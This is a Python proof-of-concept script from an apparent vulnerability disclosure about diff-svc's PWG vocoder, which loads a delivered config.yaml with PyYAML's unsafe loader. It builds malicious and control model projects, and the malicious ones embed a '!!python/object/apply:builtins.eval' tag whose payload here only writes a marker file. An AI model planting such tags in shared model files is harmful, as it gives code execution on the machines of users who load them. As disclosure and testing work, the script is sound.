#!/usr/bin/env python3
"""Build the attacker-supplied diff-svc model projects used by this PoC.

The finding is the *whole-file* YAML loader of the PWG vocoder:

    network/vocoders/pwg.py:16-19
        def load_pwg_model(config_path, checkpoint_path, stats_path):
            # load config
            with open(config_path, encoding='utf-8') as f:
                config = yaml.load(f, Loader=yaml.Loader)

The complete document of ``<vocoder_ckpt>/config.yaml`` -- a file that arrives
with the delivered model project -- is handed to PyYAML's full loader, which
constructs arbitrary Python objects for ``!!python/...`` tags.  The ordinary
configuration is only consumed *after* the parser has returned, so the
deserialization happens before any of the delivered values is inspected.

This script writes four model projects under ``<repo>/checkpoints/``.  All four
select the PWG vocoder through the documented top-level manifest and point
``vocoder_ckpt`` at their own ``vocoder_dir``; they differ only in the second
YAML file (and, for the last arm, in a tag placed in the top-level manifest):

  deser_pos      vocoder_dir/config.yaml carries a PyYAML object tag
                 -> positive sample: the tag is constructed during yaml.load
  deser_neg      the same file with a plain scalar in place of the tagged node
                 -> negative control: identical project, no deserialization
  deser_missing  vocoder_dir/config.yaml deleted
                 -> missing-file control: the loader cannot run at all
  outer_tag      the object tag is placed in the TOP-LEVEL manifest instead
                 -> boundary control: utils/hparams.py parses that file with
                    yaml.safe_load, which refuses the tag

No arm contains a ``.py`` file, native library or plugin: the only executable
semantics in the package is the YAML itself.
"""

import argparse
import hashlib
import sys
from pathlib import Path

# (package name, inner config state, put the object tag in the top manifest?)
ARMS = [
    ("deser_pos", "tagged", False),
    ("deser_neg", "plain", False),
    ("deser_missing", "absent", False),
    ("outer_tag", "plain", True),
]

HUBERT_SEED = 1234

# The delivered vocoder directory config.  generator_params is a valid
# ParallelWaveGAN generator configuration, so the product's own construction
# chain runs to completion after the loader returns; the `marker` node is the
# only difference between the positive and the negative arm.
INNER_HEAD = """\
# vocoder_dir/config.yaml -- vocoder files of the delivered model project.
generator_params:
  aux_channels: 80
  aux_context_window: 2
  gate_channels: 32
  layers: 6
  residual_channels: 16
  skip_channels: 16
  stacks: 3
  upsample_params:
    upsample_scales: [4, 4, 4, 4]
"""

INNER_TAGGED = """\
marker: !!python/object/apply:builtins.eval
  - "__import__('pathlib').Path('checkpoints/{name}/vocoder_dir/DESERIALIZED.txt').write_text('yaml.Loader constructed this: {name}')"
"""

INNER_PLAIN = """\
marker: "plain-vocoder-config-no-tag"
"""

MANIFEST_TAG = """\
marker: !!python/object/apply:builtins.eval
  - "__import__('pathlib').Path('checkpoints/{name}/MANIFEST_TAG_RAN.txt').write_text('outer manifest tag executed')"
"""


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as fh:
        for chunk in iter(lambda: fh.read(1 << 20), b""):
            h.update(chunk)
    return h.hexdigest()


def build_hubert(repo):
    """Materialise the victim-side checkpoints/hubert/hubert_soft.pt stand-in."""
    import torch

    out = repo / "checkpoints" / "hubert" / "hubert_soft.pt"
    if out.exists():
        print(f"| hubert stand-in already present: {out} ({out.stat().st_size >> 20} MiB)")
        return out

    sys.path.insert(0, str(repo))
    from network.hubert.hubert_model import HubertSoft

    out.parent.mkdir(parents=True, exist_ok=True)
    torch.manual_seed(HUBERT_SEED)
    model = HubertSoft()
    # float16 halves the file; hubert_soft()'s load_state_dict() casts back up.
    torch.save({k: v.half() for k, v in model.state_dict().items()}, out)
    print(f"| wrote hubert stand-in: {out} ({out.stat().st_size >> 20} MiB, seed={HUBERT_SEED})")
    return out


def build_package(repo, name, inner_state, manifest_tag):
    import torch
    import yaml

    base = yaml.safe_load((repo / "training" / "config.yaml").read_text(encoding="utf-8"))

    pkg = repo / "checkpoints" / name
    vdir = pkg / "vocoder_dir"
    vdir.mkdir(parents=True, exist_ok=True)

    cfg = dict(base)
    cfg["vocoder"] = "network.vocoders.pwg.PWG"
    cfg["vocoder_ckpt"] = f"checkpoints/{name}/vocoder_dir"
    cfg["work_dir"] = f"checkpoints/{name}"
    manifest = yaml.safe_dump(cfg)
    if manifest_tag:
        manifest += MANIFEST_TAG.format(name=name)
    (pkg / "config.yaml").write_text(manifest, encoding="utf-8")

    if inner_state == "absent":
        pass
    else:
        body = INNER_HEAD + (INNER_TAGGED if inner_state == "tagged" else INNER_PLAIN)
        (vdir / "config.yaml").write_text(body.format(name=name), encoding="utf-8")

    torch.save({"state_dict": {}}, vdir / "model_ckpt_steps_1000.ckpt")

    print(f"\n| package checkpoints/{name}/   inner config: {inner_state}"
          f"{'  + object tag in top-level manifest' if manifest_tag else ''}")
    for f in sorted(pkg.rglob("*")):
        if f.is_file():
            print(f"    {f.stat().st_size:>9}  {f.relative_to(repo).as_posix()}")
    return pkg


def write_sha256sums(repo, path):
    """Write the sample manifest with paths relative to checkpoints/ so that the
    lines stay readable in a normal terminal width."""
    files = sorted(repo.glob("checkpoints/deser_*/**/*")) + sorted(repo.glob("checkpoints/outer_tag/**/*"))
    base = repo / "checkpoints"
    lines = ["# sha256 (paths are relative to checkpoints/)"]
    for f in dict.fromkeys(files):
        if f.is_file():
            lines.append(f"{sha256(f)}  {f.relative_to(base).as_posix()}")
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print(f"\n| wrote {path} ({len(lines) - 1} files)")
    return lines


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--repo", default=str(Path(__file__).resolve().parent / "repo"),
                    help="path of the pinned diff-svc checkout (default: ./repo)")
    args = ap.parse_args()

    repo = Path(args.repo).resolve()
    if not (repo / "run.py").is_file():
        sys.exit(f"not a diff-svc checkout: {repo}")

    print(f"| repo: {repo}")
    build_hubert(repo)
    for name, inner_state, manifest_tag in ARMS:
        build_package(repo, name, inner_state, manifest_tag)

    write_sha256sums(repo, Path(__file__).resolve().parent / "SHA256SUMS.txt")

    print("\n| built %d model projects; only the second YAML differs" % len(ARMS))
    print("| run them with:  python run.py --config checkpoints/<pkg>/config.yaml")


if __name__ == "__main__":
    main()
